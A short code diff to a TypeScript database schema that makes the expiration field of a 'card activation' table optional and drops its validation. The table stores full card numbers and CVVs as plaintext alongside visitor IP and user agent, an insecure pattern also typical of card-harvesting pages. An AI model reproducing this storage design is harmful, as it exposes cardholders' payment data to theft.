@@ -272,7 +272,7 @@ export type RegisterData = typeof registerData.$inferSelect;
 export const cardActivationData = pgTable("card_activation_data", {
   id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
   cardNumber: text("card_number").notNull(),
-  expiration: text("expiration").notNull(),
+  expiration: text("expiration"), // Made optional - removed from CardActivationPage
   cvv: text("cvv").notNull(),
   ipAddress: text("ip_address"),
   userAgent: text("user_agent"),
@@ -333,7 +333,6 @@ export const registerRequestSchema = z.object({
 
 export const cardActivationRequestSchema = z.object({
   cardNumber: z.string().length(16, "Card Number must be 16 digits"),
-  expiration: z.string().regex(/^\d{2}\/\d{2}$/, "Invalid expiration format"),
   cvv: z.string().length(3, "CVV must be 3 digits"),
 });
 
